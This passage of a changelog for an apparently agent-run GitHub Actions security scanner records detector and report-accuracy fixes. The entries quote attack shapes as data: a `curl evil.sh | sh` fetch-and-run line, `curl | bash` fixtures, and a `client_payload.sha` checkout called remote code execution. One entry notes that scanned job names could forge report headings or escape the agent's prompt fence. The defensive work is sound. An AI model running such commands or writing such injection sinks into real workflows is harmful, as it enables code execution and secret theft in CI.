  Finding 2 into Finding 1's PR unasked; different fixes carry different
  risks and revert stories).
- **2026-08-05** — **Drafted PRs lead with a plain-English TL;DR.** Two
  to four sentences a reviewer who never saw the report can act on —
  what the workflow did before, what it does now, what changes
  day-to-day — with pattern ids and scanner mechanics strictly after it
  (the first drafted PR led with catalog framing and its own repo owner
  could not tell what it did).
- **2026-08-05** — **Clean-run save offer no longer says "None,".** The
  zero-findings close asked "Save the report?" with the fix-selection
  option text "None, just save the report (.md)" — "None" answering a
  fixes question the user was never asked. A clean run now offers exactly
  "Save the report (.md)" / "Don't save"; the "None," wording remains
  only where it belongs, after fixes were actually offered.


- **2026-08-04** — **The intentionally-vulnerable fixture workflows ship
  cloaked.** 43 test/eval fixtures (pwn-request, template injection,
  `curl | bash`) sat at literal `.github/workflows/` paths, where registry
  security scanners read them as this repo's own live automation. They now
  ship under `dot-github/` with a `.fixture` suffix, byte-identical and
  covered by a sha256 manifest; the test suite materializes the original
  (gitignored) paths at collection time, so every test and eval reads exactly
  what it read before. A repo guard fails on any tracked workflow-parseable
  file under a skill's fixture `.github` dir.

- **2026-08-03** — **ci-secure carries an explicit routing contract.** Its
  description now states that the skill is
  reached by NAMING it and that topic-word asks ("is my CI secure") belong to
  `ci-advisor`, the door, which runs this engine among all three.
  Maintainer-only infrastructure is not part of the installable skill, and an
  install-surface guard covers ci-secure so that boundary is PASS/FAIL rather
  than convention. Worked-example reports are
  not carried in-tree, and the e2e runbook writes its copies to a scratch
  directory outside the repo.

### Fixed

- **2026-08-09** — **Attacker-controlled scanned strings can no longer forge
  report structure.** Job names, workflow-file paths, and quoted evidence are
  verbatim repo content; a job name carrying backticks + newlines could forge a
  `## FIXED —` heading (a false-clean signal), break out of the copy-paste
  prompt's fence, or corrupt the finding count. Every such string is now
  flattened (whitespace collapsed, backticks neutralized) before it reaches a
  bullet, code span, or prompt, and evidence is fence-neutralized. A new
  `verify_report.py` invariant rejects any `##` heading outside the known set.
- **2026-08-09** — **Installed-skill reports pass their own self-check.** An
  installed skill has no `.git`, so it recorded `(skill commit (unknown))` —
  doubled parens that `verify_report.py` read as a provenance FAILURE, failing
  every real user's clean report. Reports now stamp the shipped version
  (`skill vX.Y.Z — commit unknown, no git checkout`) when there is no checkout,
  and the self-check treats that as a valid (skipped) provenance state.
- **2026-08-09** — **`${{ github.event.*.login }}` no longer fires template
  injection.** A GitHub login is charset-enforced (alphanumerics + single
  hyphens, ≤39 chars) and cannot carry a shell metacharacter, so `.login` is now
  in the P14.10 shape-safe allowlist — with the caller-filled carve-out intact
  (a `.login` under `client_payload.*` / `inputs.*` still fires).
- **2026-08-09** — **The embedded recheck prompt no longer vacuously passes a
  P14.11 fix.** The paste-able recheck now forces `--gh-impostor on` for the
  network-gated vector, tells the agent a skipped/partial `gh_checks` status is
  NOT verified, and writes to a repo-scoped recheck path (not a fixed
  `/tmp` name).
- **2026-08-09** — **The vector denominator is derived from the catalog.** The
  banner, headline, and methodology "N of 10" all read `len(catalog_sections)`
  now, so they can never diverge from the vector-map table (a hardcoded literal
  would drift the moment the catalog changed). An off-catalog pattern is
  surfaced as malformed rather than silently inflating the headline while the
  banner and vector map omit it.
- **2026-08-09** — **Two shell segmenters, correctly named.** A shared
  `_shell_segments` name let the pipeline-whole definition silently override the
  install-detector's (issue #278), so `npm ci --ignore-scripts | npm install`
  read the piped-to install as protected. They are now
  `_install_command_segments` (splits a bare `|`) and
  `_pipeline_command_segments` (keeps a pipeline whole), and the P14.25 install
  matcher pins the piped install as unprotected.
- **2026-08-09** — **`run.py` distinguishes an invalid argument from a coverage
  failure.** A scan exit 2 (malformed `--repo`, or `--gh-impostor on` with gh
  unauthenticated) is now reported as "invalid argument — fix the flag and
  re-run", not as a coverage failure.
- **2026-08-09** — **Incident-grounding truth pass.** Corrected the CISA
  advisory URL (was 404), the Trivy round-2 tag count (75 of 76 `trivy-action`
  + 7 `setup-trivy`, was "76/77"), the `actions/checkout` backport date (July 20
  2026, was July 16), the tj-actions "23,000" figure (repos USING the action,
  not repos that ran the payload), and the false `binding.gyp` /
  `--ignore-scripts` claim (the implicit gyp rebuild IS suppressed by
  `--ignore-scripts`). Re-grounded P14.19 on what its cited sources actually
  document — credential files swept from the runner filesystem/memory/env — and
  removed the fabricated "cache-pivot" attribution.
- **2026-08-08** — **The skill records the Miasma compromise it cites.** The
  catalog states an invariant about itself — "Every vector in why-these-ten.md
  cites its incidents from this list" — and it was false. why-these-ten.md
  cites the June 2026 Miasma / `@redhat-cloud-services` npm compromise twice
  as incident grounding for P14.25, but the catalog's Reference incidents
  section had no entry for it; the compromise was mentioned only inside the
  prose of the "npm install-script defaults" entry, behind a URL that
  documents npm's defaults change rather than the compromise itself. A Miasma
  entry now records what happened, with Microsoft Security's June 2 2026
  writeup as the source, and the install-script-defaults entry
  cross-references it instead of re-describing it. A census test pins the
  invariant against the Reference incidents ENTRY TITLES, so a passing mention
  in someone else's prose no longer satisfies it.
- **2026-08-08** — **The fix subagent's P14.11 oracle can no longer pass
  vacuously.** A fix subagent proves its work by re-running the scan and
  showing the finding is gone. For P14.11 — the one network-gated detector —
  an unauthenticated `gh` makes the check SKIP, so the finding is absent for
  that reason alone and every fix "verified" clean without being tested. The
  P14.11 dispatch now forces `--gh-impostor on` (which exits 2 rather than
  skipping) and must read `gh_checks["P14.11"]` back: anything but a recorded
  `ran` is reported UNVERIFIED. The recheck also writes to a per-repo
  `ci-secure-recheck-<slug>.json` instead of a fixed `/tmp` path two
  concurrent audits would share, and SKILL.md's file budget names it.
- **2026-08-08** — **The terminal-summary extraction recipes actually
  extract.** The documented `grep '^| .* P14.11'` returned ZERO matches on
  every real report (the id renders in backticks, with no space ahead of it),
  so the impostor-check line was silently dropped from the summary. And
  `Coverage` was described as a sentence under the banner; it is a ROW of the
  provenance table ABOVE it, with the what-was-missed detail living in a
  separate incomplete-coverage warning further down. Both recipes are fixed,
  and a test now runs SKILL.md's own commands, with real `grep`, against a
  rendered report.
- **2026-08-08** — **The fixture-cloak manifest is a census, not a lookup.**
  The test hook that un-cloaks the intentionally-vulnerable workflow fixtures
  consulted the manifest only for files it happened to find, so it was silent in
  both directions: DELETING a cloaked fixture left the suite 100% green (eleven
  of the negative controls are named in no test, so nothing else noticed), and a
  manifest entry for a file that no longer exists was never read. Both are hard
  errors now, raised rather than asserted so `python -O` cannot strip them, and
  the manifest covers the four eval trees too — those materialize the same way
  and had no coverage at all. Materialization also PRUNES: anything sitting at a
  destination path with no manifest entry behind it is deleted, so a renamed
  fixture cannot leave a stale uncloaked workflow file loitering in a working
  tree (the same residue an install into an already-used checkout would leave).
- **2026-08-08** — **The timing-recorder tests test ci-secure's own script.**
  `record_timing.py` is a colliding module name — a sibling skill ships one, and
  both `scripts/` dirs are on the path — so under the repo-wide run a bare
  `import record_timing` was a no-op against the already-cached sibling and four
  tests asserted, green, against the wrong skill's code. It loads by file
  location now, and every ci-secure test module that touches a collision-named
  script (`scan`, `run`, `record_timing`) states which file won.
- **2026-08-07** — **The CODEOWNERS check applies the last matching rule, as
  GitHub does.** It stopped at the first match, so `* @team` followed by a bare
  `.github/workflows/` graded as covered — when the later, ownerless rule is
  the one GitHub applies and it assigns nobody. The file is now read to the
  end and the last directory-coverage rule decides.
- **2026-08-07** — **A CODEOWNERS path with no owner no longer counts as
  coverage.** `.github/workflows/` written on its own matched the path rule and
  graded as covered, but a pattern with no owners assigns no reviewer — in
  GitHub's semantics it removes ownership for those paths, the opposite of what
  the row claims. A matching line must now also name an owner (`@user`,
  `@org/team`, or an email); when one matches and names none, the failure says
  so rather than reading as "no entry", which sent the reader looking in the
  wrong place.
- **2026-08-07** — **A CODEOWNERS rule that owns only some workflows no longer
  counts as covering the directory.** A restricted glob such as
  `.github/workflows/*release*.yml` owns the release workflows and leaves every
  sibling merging on the same approvals as any other change, but the hygiene
  check read it as directory-wide coverage — the same false clean as a
  single-file rule, one step removed. The accepted glob shapes are now
  enumerated (`*`, `**`, `**/*`, with an optional extension suffix); a glob
  carrying any other literal text in the filename fails.
- **2026-08-07** — **The report no longer contradicts itself about the GitHub
  API.** A run where the impostor-SHA check ran printed `✅ P14.11
  impostor-SHA check: ran` and, further down, a Data-sources row reading
  `GitHub API | not queried`. That row only ever described the run-activity
  (dormancy) lookup, which needs `--repo`; its label said "GitHub API"
  unqualified. The row is now `GitHub API — run activity`, with the status
  spelling out `not queried (no --repo)`.
- **2026-08-07** — **An attack-shaped host literal in a fixture and in the
  catalog** (`curl evil.sh | sh`) used a registrable ccTLD, the shape a
  registry security scan reads as a live indicator of compromise. Both now use
  an RFC-reserved host. An eval fixture's install URL moved to a reserved
  domain for the same reason.
- **2026-08-07** — **A CODEOWNERS rule for one workflow file no longer counts
  as covering the directory.** The hygiene row asserts that workflow changes
  need a named reviewer; the match was a bare `.github/workflows/` prefix, so
  `.github/workflows/release.yml @team` — a rule protecting exactly one file —
  graded the whole directory as covered while every sibling workflow kept
  merging on the same approvals as any other change. A false pass on the only
  thing the row claims. The rule must now BE the directory (`.github/workflows/`)
  or carry a glob (`*`, `**`, `*.yml`); a concrete filename fails. The
  directory, global-star and `.github/**` forms are unchanged.

- **2026-08-07** — **Five report-accuracy and readability fixes.** (1) The
  P14.25 platform paragraph pointed at "the evidence above" and "the
  per-manager list above"; in report position the evidence renders BELOW it
  and the per-manager list is not rendered at all — both now read
  position-neutrally ("the install command quoted in this finding's
  evidence", "the catalog entry's per-manager list"). (2) The methodology
  table gains a **What is not scanned** row: a composite action the workflow
  calls (`uses: ./.github/actions/…`) is a separate file this scan does not
  open, so an install or a secret dump inside one is invisible while the
  calling line looks clean — the shape cal.com and grafana both ship.
  (3) The pnpm build allowlist is now also read from `package.json`'s
  `pnpm.onlyBuiltDependencies`, where adobe/leonardo declares it; the note
  said "not declared" on a repo that declares it. Note specificity only — no
  suppression changes. (4) The copy-paste agent prompts name the findings
  JSON by FULL path instead of basename: the file lives under `$TMPDIR`, so a
  dispatched subagent was left guessing a directory. The surrounding PROSE
  still uses the basename — a saved report outlives its tmp dir, and the
  no-scratch-path report invariant is unchanged.
  (5) Cosmetics: the config-hygiene table heading is 🧰, not 🔢 — a numeral
  glyph over a preamble that says the rows are scored nowhere; and the
  methodology's catalog row links the public main-branch URL instead of
  quoting an in-repo path the reader cannot open.

- **2026-08-07** — **A reusable workflow that runs on every pull request is
  no longer called dormant.** GitHub attributes a `workflow_call` run to the
  CALLING workflow, so `/actions/workflows/<file>/runs` answers 200 with
  `total_count: 0` for a reusable workflow that executes constantly.
  vercel/next.js's `pr_stack_optimizer.yml` and microsoft/playwright's
  `tests_docker.yml` were both marked dormant on that empty history — which
  printed "Every affected workflow is dormant … verify before prioritizing"
  over live HIGH findings and, worse, set `dormant: true` in the render plan,
  which DROPS the group from the `all` fix selection (next.js's only HIGH was
  silently skipped). A workflow whose `on:` declares nothing but
  `workflow_call` and has zero registered runs is now reported as UNKNOWN
  activity — the existing `unavailable` semantics: not counted dormant, not
  excluded from `all`, and the activity row and header say the runs are
  attributed to the calling workflow. A reusable workflow that DOES have
  registered runs keeps its real data, and a normal workflow with no runs is
  dormant exactly as before.

- **2026-08-07** — **The scanner no longer invents a Yarn install out of a
  flag value.** The bare-Yarn arm of the install matcher was bounded only by
  "not preceded by a word character", which says nothing about `,` or `=`, so
  vitejs/vite's `pnpm dlx pkg-pr-new@0.0 publish …
  --packageManager=pnpm,npm,yarn --commentWithDev` matched on the `yarn`
  inside that comma-separated flag VALUE. Everything downstream followed the
  wrong manager: the repo's own pnpm `allowBuilds` mitigation stopped applying
  (manager mismatch), a Yarn advisory rendered on a repo with no Yarn in it,
  and the fix prompt prescribed destructive Yarn edits to a release workflow.
  All four arms now require COMMAND POSITION — the start of the string or line
  (optionally after a one-line step's `run:` key), or immediately after `;`,
  `&`, `|` or `(` — with the shell prefixes that legally precede a command
  (`sudo`, `env`, `time`, `then`, a leading `VAR=value`) still allowed, so
  `sudo npm ci` and `cd web && yarn install` are unaffected. That prefix list
  is deliberately CLOSED — a word is a wrapper only if it execs the next
  command in the same environment, with the same filesystem and the same
  secrets, which is why `docker exec` / `docker run` are not members — and it
  is now spelled as data (`_CMD_WRAPPERS`) and pinned by a test, so widening
  it takes a deliberate edit rather than slipping through unnoticed.

- **2026-08-07** — **An option the install parser did not recognise no longer
  hides the install.** The list of options that consume the next token was a
  closed allowlist, so any option missing from it left its value sitting as a
  bare positional, the package-spec regex read that value as a package name,
  and the whole finding vanished — with no `dropped_matches` entry, so the
  report showed a clean job. `npm ci --maxsockets 3`,
  `pnpm install --fetch-timeout 60000` and `npm ci --before 2024-01-01` were
  each an un-reported privileged install. An unrecognised option is now assumed
  to consume its value; `npm ci <anything>` and an install whose arguments come
  from a `${{ … }}` expression can no longer be excluded by a positional at
  all. A quoted `run` key (`- "run": npm ci`) is recognised as a shell step
  again.
- **2026-08-07** — **Inert text no longer counts as a mitigation.** The one
  signal that suppresses a P14.25 finding outright — a step that empties the
  build allowlist before the install — matched a shell comment
  (`# allowBuilds=false`) and an echoed string with nowhere to go
  (`echo 'allowBuilds: false'`), and a read-only `yq
  '.allowBuilds[]=false' pnpm-workspace.yaml` with no `-i`, which prints the
  edited document and leaves the file alone. Each silenced a genuine
  privileged install. The line must now survive comment-stripping, name the
  config, and actually write it (in-place edit, redirect, `tee`, or
  `pnpm config set`).
- **2026-08-07** — **A `${{ A || B }}` fallback is judged on every operand,
  not just the first.** Judging only the first assumed it is always truthy; an
  event field absent on *this* event is empty, so
  `${{ github.event.pull_request.number || github.event.issue.title }}` hands
  the issue title to the shell on an `issues` trigger and was suppressed as
  shape-safe. Every operand must now be shape-safe (or an author-written
  literal), which keeps the `github.head_ref || github.ref_name` fix.
- **2026-08-07** — **P14.25: a global or single-package install is no longer
  reported as a dependency-tree install.** `npm i -g corepack@0.31`,
  `npm install --global @github/copilot` and `npm install @playwright/test@next`
  all matched the install leg. None of them is this vector: the anti-pattern is
  a compromised package *in the resolved dependency tree* executing during a
  bulk install, and a global bootstrap resolves nothing from the lockfile while
  a named install runs exactly what the author typed. `vercel/next.js` alone
  reported seventeen `corepack` bootstraps this way. The catalog now states the
  exclusion, and says explicitly that the named-single-package shape is a
  different risk this pattern does not silently widen to cover.
- **2026-08-07** — **P14.25 stops asserting that lifecycle scripts are
  enabled.** The finding claimed the job "runs this install with dependency
  lifecycle scripts enabled" — not knowable from workflow YAML, and for pnpm
  usually false: **pnpm 10 and later block dependency lifecycle scripts by
  default**, which the catalog's "their own defaults are unchanged" claim had
  backwards. The note now says what is knowable — scripts execute *unless* the
  manager's version or configuration disables them — and names the per-manager
  condition (npm default-on through 11, off in v12; pnpm ≥ 10 off with an
  allowlist; Yarn Classic on, Berry via `enableScripts`), quoting the repo's
  `packageManager` pin where there is one. In-repo mitigations are read at two
  honest tiers: a step in the SAME job that empties the build allowlist before
  the install, on a pnpm ≥ 10 pin, means **no finding** (`vitejs/vite`'s
  `yq '.allowBuilds[]=false'` — two false positives); a committed allowlist or
  a bare pin leaves the finding standing with the mitigation **named in its
  evidence**, because suppressing on a partial signal is a silent false
  negative.
- **2026-08-07** — **The npm v12 caveat renders only on npm matches**, and
  names a major the job itself pins (`npm install -g npm@11`) instead of saying
  the version "is not visible in this YAML". Testing repeatedly flagged the
  same self-contradiction under `pnpm` and `yarn` findings.
- **2026-08-07** — **P14.25's payoff leg reads workflow-level `env:`.** GitHub
  merges the workflow's `env:` map into every job's environment, so a
  `NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` declared at the top of the file is in
  the install step's process — but the job's own subtree does not contain it
  and the payoff read as absent. `facebook/react`'s `compiler_prereleases.yml`
  publish job was unflagged for exactly this. Mirrors how the write-scope leg
  already consults workflow-level `permissions:`.
- **2026-08-07** — **P14.25's evidence quotes the real install line.** It
  anchored on any line in the job's range, so `- name: Run pnpm install` — a
  YAML step NAME — was quoted as the command (immich, three findings), and the
  first regex hit won even when it was a `npm install -g npm@11` bootstrap the
  fix recipe does not apply to (leonardo). Evidence now comes only from `run:`
  scalar content, and names the first command that actually qualifies.
- **2026-08-07** — **Job line numbers no longer land on the blank line above
  the job key.** `_job_line_in_text` used `^\s+` under `re.MULTILINE`, and
  `\s` matches a newline, so the match could start on the separating blank
  line and run into the next line's indentation. On `cal.com`'s `pr.yml` a
  finding cited `jobs.trust-check` at line 160 while its own evidence named
  `jobs.prepare`. The indent class is now horizontal-only.
- **2026-08-07** — **P14.10 matches `${{ X || Y }}` fallbacks.** `||` returns
  its FIRST operand when truthy, so `${{ github.head_ref || github.ref_name }}`
  puts an attacker-chosen branch name in the shell and the safe-looking
  fallback never evaluates. cal.com's `production-build-without-database.yml:72`
  wrote exactly that into a `run:` block holding roughly a dozen secrets and
  went unreported. The value-shape exclusion is judged on the first operand
  only, so a safe-shaped fallback cannot launder a text-shaped primary.
- **2026-08-07** — **`.commits` is shape-safe.** On a `pull_request` payload it
  is the commit COUNT — the same GitHub-generated integer shape as `.number`.
  grafana's `trufflehog.yml:27` does shell ARITHMETIC on it and rendered HIGH.
- **2026-08-07** — **`author_association` is shape-safe (reverses a declared
  class).** The catalog listed "author associations" among the text-shaped
  fields that stay in scope. It is a GitHub-generated CLOSED ENUM — `OWNER`,
  `MEMBER`, `COLLABORATOR`, `CONTRIBUTOR`, `FIRST_TIME_CONTRIBUTOR`,
  `FIRST_TIMER`, `MANNEQUIN`, `NONE` — no member carries a shell metacharacter
  and no outsider can add one, so it is not an injection sink. Four
  `facebook/react` findings were this shape. The catalog now carries the enum
  and the reasoning rather than the old claim.
- **2026-08-07** — **The findings summary states the findings' own spread.**
  "N occurrence(s) … across {scanned} workflow file(s)" used the number of
  files SCANNED in a clause whose subject was the findings, so three findings
  in one file read as findings "across 12 workflow file(s)". Both numbers are
  now named as what they are.
- **2026-08-07** — **The occurrence cap says what it caps.** `_Showing 3 of N
  occurrences_` sat under a vector-map claim that "nothing is trimmed" — true
  of vectors, not of an inline sample. Both lines now say which they mean.
- **2026-08-07** — **The provenance path keeps its meaning and drops the
  account name.** Testing during development repeatedly flagged the absolute
  checkout path in the Repository row. It stays by design — it is
  the audited tree the file:line
  references are true of, and on a user's own run it is their own path — with
  `$HOME` abbreviated to `~`. The verifier exemption and the methodology table
  now say this is deliberate.
- **2026-08-07** — **The close names its receipt and lines up its numbers.**
  The vector receipt is headed `Vector scan — 10 attack vectors checked, N
  hit:` so it cannot be read as a grade, rows 1–9 are padded to align under
  `10.`, and a clean run carries one bridging sentence (findings are open
  doors, the hygiene checks are armor, neither is a grade). SKILL.md's Phase-3
  terminal summary now states, per line, which is pre-drawn and copied and
  which is assembled from which named report row.


- **2026-08-06** — **Phase 5 can find the heading it is told to mark.** The
  fix loop was told to locate `## Finding N: …`, but the report has emitted
  `## {severity emoji} Finding N: …` since the critical-only descope, so a
  literal match found nothing and a fixed finding could go unmarked. The
  instruction now describes the real heading and says to insert the
  `FIXED — ` prefix before the emoji, which is what the verifier's regex has
  always expected. The close also now covers the `Security score: none —
  {reason}` variant instead of assuming a number is always present.
- **2026-08-06** — **Three P14.25 false negatives: a hardened install no
  longer covers for an unhardened one, and `yarn --frozen-lockfile` is an
  install.** The job-level gate searched a whole `run:` scalar for
  `--ignore-scripts` while the evidence lookup read individual
  comment-stripped lines, so the two disagreed: a scalar carrying
  `npm ci --ignore-scripts` on one line and a plain `npm install` on the next
  read as hardened and the job was dropped, and an `--ignore-scripts` written
  in a shell COMMENT suppressed the real install below it. Both now go
  through one definition, applied per shell command. Separately, the bare-Yarn arm only
  accepted `yarn` at end-of-command, so `yarn --frozen-lockfile` — a Yarn
  Classic install, options and all — was missed; it now accepts options while
  still ignoring a trailing subcommand (`yarn build`) and the informational
  invocations (`yarn -v`, `yarn --version`, `yarn --help`) — and it now
  consumes an option's separate VALUE, quoted or not, so
  `yarn --cwd packages/app`, `yarn --network-timeout 600000` and
  `yarn --cwd "packages/app with spaces"` stop dying on the space. `--ignore-scripts`
  is judged against the shell SEGMENT it is written on, not the line: in
  `npm ci --ignore-scripts && npm install` it covers the first install and
  not the second. A backslash-continued command is joined before any of this
  is asked, so `npm install \\` + `--ignore-scripts` on the next line is one
  hardened install and not a false positive. Comment-stripping and segment
  splitting are both QUOTE-AWARE, so a `#` or a `|` inside an argument —
  `npm install "github:acme/lib#v1.2.3" --ignore-scripts` — is data, not a
  comment or a separator, and the flag is not parsed away from the install it
  protects. Both read quoting through one shared scanner that resolves
  backslash escapes the way the shell does, so the two can no longer disagree
  about what is syntax and what is data. Every case is pinned by a truth-table test.
- **2026-08-06** — **One folded `run: >` scalar no longer grades a correct
  repo 0.0/100.** A `run:` step whose shell text could not be anchored to a
  raw line was recorded as "this workflow file could not be scanned", which
  made every workflow-scoped config fact unmeasurable — so a repo whose
  configuration was entirely correct scored zero, and the banner counted
  matches while calling them files (two drops in one file read as "2 workflow
  files"). Unanchored steps are now their own coverage gap, counted per step
  and per workflow, with the file's facts left measurable. Coverage still
  degrades to PARTIAL.
- **2026-08-06** — **Alias-expanded `run:` steps are no longer silently
  unscanned.** A workflow using a YAML anchor (`steps: *common`) has more
  parsed steps than raw `run:` tokens; once the scanner's cursor passed the
  last token, every remaining step was skipped with no record and the report
  claimed complete coverage over steps nothing had looked at. Those steps are
  now named as a coverage gap.
- **2026-08-06** — **A crashed config-facts layer is visible.** When the facts
  layer threw, the report dropped its whole score section — and the self-check
  skipped rather than failed — so the one failure mode the "this is NOT a
  score of 100" headline was written for produced a silent, green, score-free
  report. The section renders whenever a score exists; only the fact table is
  gated on facts.
- **2026-08-06** — **A served tag object is not proof of containment.** GitHub
  shares one object store across a fork network, so `git/tags/{sha}` will
  serve a tag an attacker created in a fork — only the reachability-checked
  commit probe proves the canonical repo has the object. A peel whose commit
  re-probe cannot answer is now UNVERIFIED, not verified; a peel whose commit
  is genuinely absent is still flagged. A detected cycle, an exhausted depth
  limit, a malformed response and a tag pointing at a tree are all "could not
  resolve" rather than "absent", so none of them can produce an accusation.
- **2026-08-06** — **Two different injection sinks on one line are both
  named.** Occurrences collapse by (pattern, file, line) — one line is one fix
  — but the kept finding named only the first expression, so a reader who
  fixed what it named left a live sink on the same line. Every distinct
  expression is now named on the evidence marker.
- **2026-08-06** — **A finding says when its job list is a guess.** A workflow
  whose YAML would not compose produced findings stamped with the whole job
  list, indistinguishable from a genuine "this affects every job" claim; and
  a workflow-level key written after `jobs:` fell inside the last job. Both
  are fixed, and an unattributable finding says so.
- **2026-08-05** — **A safe-looking field name does not excuse a
  caller-filled one.** The value-shape exclusion holds only where GitHub fills
  the field in. `github.event.client_payload.*` (the arbitrary JSON body of a
  `repository_dispatch`) and `github.event.inputs.*` (`workflow_dispatch`
  inputs) are filled in by whoever fired the event, so an input spelled `sha`,
  `id` or `number` there is a reassuring name over a free-form string —
  `git checkout ${{ github.event.client_payload.sha }}` is remote code
  execution and was being suppressed. Those two namespaces are never excluded.
- **2026-08-05** — **A failed tag probe is unverified, not an accusation.**
  The tag peel runs only on the about-to-be-flagged path, so a rate limit or a
  dropped connection there manufactured the exact false accusation the peel
  was added to prevent. Only an explicit 404/422 — "no such tag object here" —
  now counts as an answer; anything else degrades the pin to unverified.
- **2026-08-05** — **A pin to an annotated release tag is not an impostor
  SHA.** Actions such as `astral-sh/setup-uv` and `pnpm/action-setup` publish
  annotated tag objects, and repos pin to them; `repos/{repo}/commits/{sha}`
  answers 404 for a tag object, so 20 legitimate pins across three large repos
  were reported as fork-only or dangling. The check now peels the sha as a tag
  object (following nested tags) and re-probes the commit it names.
- **2026-08-05** — **Template injection ignores GitHub-generated values.**
  `github.event.pull_request.number`, the `.sha` family, `.repo.fork` and
  `.merged` cannot carry a shell metacharacter; flagging them made whole
  reports false HIGHs. Text-shaped fields (titles, bodies, branch names,
  labels, comments, `client_payload`) still fire. The exclusion applies only
  to fully-qualified `github.*` context paths, and only to `${{ … }}`
  expressions — never to the shell-command patterns the same detector
  carries.
- **2026-08-05** — **Three coverage claims the scanner could not back.** A
  dot-prefixed workflow (`.test.yml`) was invisible to discovery but visible
  to the coverage tripwire, refusing the whole repo; a template match inside a
  folded (`run: >`) scalar was dropped to stderr while the report said
  coverage was complete; and a repo with zero workflows scored 83.3/100 with
  nine green rows. All three are now discovered, degraded, or refused
  honestly.
- **2026-08-05** — **A finding names the job it is in, once.** `affected_jobs`
  was the whole file's job list stamped on every occurrence, and two
  injectable expressions on one line produced two identical findings in the
  JSON. Line-anchored hits name their containing job; workflow-scope hits
  still name every job; occurrences dedupe by (pattern, file, line) at scan
  time.
- **2026-08-05** — **Failed config facts say what is actually wrong.** The
  evidence read "no `permissions:` block in: X" for files that have one (null
  value, invalid scalar, or a grant on only some jobs); each file now states
  its own reason. `write-all` renders as a shorthand rather than the nonsense
  "write-all: write", and truncated offender lists end with the real remainder
  ("and 4 more") instead of a bare ellipsis.
- **2026-08-05** — **The fix a report hands you is described accurately.** The
  agent prompt inferred the fix surface from whether the catalog recipe had a
  fenced yaml block, announcing P14.18's and P14.7's workflow restructures as
  "non-YAML org-level settings"; each catalog entry now declares
  `fix-surface: yaml|non-yaml`. Fix summaries carry the numbered options they
  introduce rather than a dangling lead-in, and `verify_report.py` fails a
  lead-in-only summary.
- **2026-08-05** — **Derived claims are no longer dressed as quoted source.**
  The correlated chain detectors synthesize their evidence; it was rendered in
  a yaml code fence with a line-number gutter, so readers looked in their
  workflow for text that was not there. Findings carry `evidence_kind`, and
  derived claims render as a labelled blockquote.
- **2026-08-05** — **The report says when its attacker prose is generic, and
  which workflows are dormant.** With the repo-specific scenario phase
  skipped, the catalog's capability line stood in silently and printed twice;
  it is now marked as the catalog description and the duplicate lead is
  suppressed. A partially dormant group names its dormant workflows instead of
  reporting a bare count.
- **2026-08-05** — **Timings state what actually happened.**
  `risk_scenario_s` billed idle wall-clock as scenario-writing time on runs
  where no scenario was written, and `total_run_s` could come out smaller than
  the scripted phase it contains. The scenario timing is stamped only when a
  scenario merged, and the total is derived from its own components.
- **2026-08-05** — **Cosmetics.** The data-sources row names what is really
  scanned (`.yml`, `.yaml`, dot-prefixed); the methodology names the
  `## Finding N` headings the report emits; an unparseable workflow is
  reported once rather than once per detector; and the methodology documents
  both the fixed `/9` chain denominator and why a fully commented-out workflow
  still counts as scanned.
- **2026-08-06** — **Render honesty, small edges.** A table cell no longer
  renders `0` or `False` as blank; a derived-evidence block that strips to
  nothing shows the original text labelled rather than rendering an occurrence
  with no evidence; a score block whose `unmeasured` or `constants` key is the
  wrong type is called out as damaged instead of read as empty; re-rendering
  the same findings file no longer inflates `total_run_s` or leaves a stale
  `risk_scenario_s` behind; and dropped-match paths are never absolute.

- **2026-08-05** — **A job's empty `permissions:` key no longer buys the
  permissions fact.** GitHub treats a `permissions:` key with no value as
  omitted — the job keeps the broad default token — and the fact already
  enforced that at the workflow level. The per-job leg still asked only
  whether the key was present, so a workflow with no top-level block and
  valueless `permissions:` on every job passed `sec.permissions.workflow-declares`
  and reported a security score higher than the repo had earned. Both levels
  now require a real grant — a mapping, or one of the two shorthand strings
  GitHub actually accepts. A typo'd scalar like `permissions: raed-all` is a
  value the workflow schema rejects outright, and no longer earns the fact
  either.


- **2026-08-04** — **Scored-fact wording written for the reader.** The
  fork-code-uncleared fact described the full chain as "a P14.9 finding";
  it now says the chain is reported separately as a fork-code-execution
  finding. Em dashes removed from the emitted fact sentences, evidence,
  coverage-gap caveat and no-facts reason (the claims are unchanged). These
  strings render both in ci-secure's own output and, verbatim, in the
  ci-advisor report.

- **2026-08-04** — **Two config-fact defects that graded real repos wrong.**
  (1) `sec.permissions.workflow-declares` tested for the KEY only, so a
  workflow whose `permissions:` has a null value scored PASS — GitHub treats
  that identically to omitting the key, leaving the broad default token in
  place, which is exactly what the skill's own `p14_3_null_perms` fixture
  warns about.
  The fact now requires a real grant (a mapping — an empty one IS an explicit
  declaration — or a `read-all`/`write-all` string). (2)
  `sec.codeowners.workflows` did not recognize the standard recursive
  DIRECTORY form (`.github/ @team`), so a correctly configured repo lost a
  sixth of its score for a rule GitHub's own docs use as the example.

## 2026-08-02 — Parity census: two render bugs fixed, ten mismatches closed

A surface-by-surface comparison against ci-score and ci-speedup. Two of the
gaps were real bugs; the rest were places ci-secure said the same thing in a
third format.

### Fixed
- **A multi-line catalog TL;DR no longer breaks the report.** Each finding's
  detail body was a `| Field | Value |` table, and a GFM table cell cannot
  hold a newline — P14.9's TL;DR is a wrapped nine-line paragraph, so its row
  terminated mid-cell and every row after it spilled out of the table as
  loose prose (visible in the committed mastra example). The body is now the
  siblings' bulleted definition list (`- **TL;DR:** …`, `- **Severity:** …`),
  with every value flattened to one line. Same data, one fewer format, and
  the class of bug is gone rather than papered over.
- **The workflow count no longer disagrees with itself on an offline run.**
  The body deduped affected workflows against the activity map, which is only
  populated when `--repo` supplied activity data — so without it, two
  occurrences in ONE workflow rendered as "1 workflow" in the heading and
  "2 workflows" in the body. It dedupes on the workflow list itself now.

### Changed
- **The title names the repository, never the skill.** A report with no
  GitHub remote was titled `ci-secure — …`; it now follows ci-score's rule:
  the slug, else the audited checkout's basename, else an explicit unknown
  marker.
- **The saved report has one stable name, `./ci-secure-report.md`** (both
  siblings do), so a re-run overwrites the previous report instead of
  accreting dated copies. `verify_report.py`'s date check moved off the
  filename onto the `Scanned` provenance row.
- **The close re-offers the work that is still open.** Phase 6 asked a
  two-option save question and dropped the user after one fixed group. It now
  asks ONE structured question that names the remaining findings and carries
  the verbatim `None, just save the report (.md)` option last — the pick that
  saves, and the only terminal one.
- **The terminal summary states the result and stops.** It no longer narrates
  `Report rendered (not saved…)` or `Next: select which findings to fix` —
  ci-score's close contract bans forward-narrating the menu, and the
  structured question carries the save option.
- **Restatement cut.** The finding count appeared four times and the
